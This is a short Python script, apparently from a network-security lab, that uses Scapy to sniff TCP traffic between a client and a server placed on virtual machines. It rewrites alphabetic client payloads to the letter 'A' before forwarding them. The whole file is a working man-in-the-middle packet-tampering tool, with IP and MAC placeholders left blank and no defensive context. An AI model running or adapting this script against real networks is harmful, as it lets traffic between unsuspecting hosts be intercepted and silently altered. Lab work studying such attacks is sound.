#!/usr/bin/python

from scapy.all import *

VM_CLIENT_IP = ""
VM_CLIENT_MAC = ""
VM_SERVER_IP = ""
VM_SERVER_MAC = ""
VM_ATTACKER_IP = ""
VM_ATTACKER_MAC = ""

def spoof_pkt(pkt):
	if pkt[IP].src==VM_CLIENT_IP and pkt[IP].dst==VM_SERVER_IP:
		if str(pkt[TCP].payload).isalpha(): # isalpha() returns True if all characters in the string are alphabets.
			IPLayer = IP(pkt[IP])
			del(IPLayer.chksum)
			del(IPLayer[TCP].payload)
			del(IPLayer[TCP].chksum)
			Data = "A"
			newpkt = IPLayer/Data
		else:
			newpkt = pkt[IP]
		send(newpkt, verbose=0)
	elif pkt[IP].src==VM_SERVER_IP and pkt[IP].dst==VM_CLIENT_IP:
		newpkt = pkt[IP]
		send(newpkt, verbose=0)

pkt = sniff(filter='tcp and (ether src '+VM_CLIENT_MAC+' or ether src '+VM_SERVER_MAC+')', prn=spoof_pkt)

